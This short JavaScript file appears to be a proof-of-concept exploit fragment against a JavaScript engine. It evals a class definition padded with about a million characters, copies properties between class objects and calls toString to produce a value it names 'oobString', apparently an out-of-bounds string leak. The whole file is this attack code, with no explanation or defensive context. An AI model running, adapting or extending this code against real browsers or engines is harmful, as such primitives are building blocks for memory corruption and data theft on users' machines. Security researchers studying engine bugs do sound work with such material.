function getHiddenValue() {
    var obj = {};
    var oob = "/re/";
    var str = ("class x extends Array{" + (oob = oob.replace("re", ("*").repeat(1048576)))) + "}";
    var fun = eval(str);
    Object.assign(obj, fun);
    return obj;
}
function makeOobString() {
    var hiddenValue = getHiddenValue();
    var str = "class x extends Array{}";
    var fun = eval(str);
    try { Object.assign(fun, hiddenValue); } catch (e) {}
    let v30;
    try { v30 = fun.toString(); } catch (e) {}
    var oobString = v30;
    return oobString;
}
var oobString = makeOobString();
